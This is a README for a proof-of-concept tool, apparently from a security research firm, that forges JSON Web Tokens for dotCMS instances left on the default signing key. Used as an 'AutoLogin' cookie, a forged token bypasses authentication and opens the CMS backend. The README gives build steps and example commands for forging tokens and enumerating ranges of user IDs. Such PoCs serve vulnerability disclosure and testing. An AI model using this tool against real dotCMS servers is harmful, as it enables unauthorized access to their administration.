# dotCMS Token Generator

This PoC tool allows the generation of Json Web Tokens (JWT) for .dotCMS 
instances that use the default signing key. By using the generated token
as "AutoLogin" cookie, it is possible to bypass the dotCMS authentication 
and access the CMS backend. 

## Building
This is a Maven repository, you can build the JAR as follow

```
mvn package
```

## Help
The tool is quite self explaining

```
java -jar ./dotCMSTokenGenerator-0.0.1-shaded.jar 
----- dotCMS TokenGenerator PoC by MOGWAI LABS GmbH (https://mogwailabs.de) -----

usage: generate_dotCMS_JWT.jar
 -e,--enumerate <arg>   enumerate usernames (e.g. -e 1:100:dotcms.org.
                        --> dotcms.org.[1-100]
 -k,--key <arg>         custom signing Key, the JWT will be signed with
                        this key.
 -o,--output <arg>      output File for JWT List
 -u,--user <arg>        userID

Example usage: generateDotCMS_JWT.jar -u 'dotcms.org.1'
Example usage: generateDotCMS_JWT.jar -e '2700:2900:dotcms.org.' -o '/tmp/tokens.lst'

```

## Issues

This tool was build/tested with Oracle Java 1.8. If you are using a newer/different Java version
you might have to run the JAR file as follows:


```
java --add-modules java.xml.bind -jar dotCMSTokenGenerator-0.0.1-shaded.jar  [options] 
```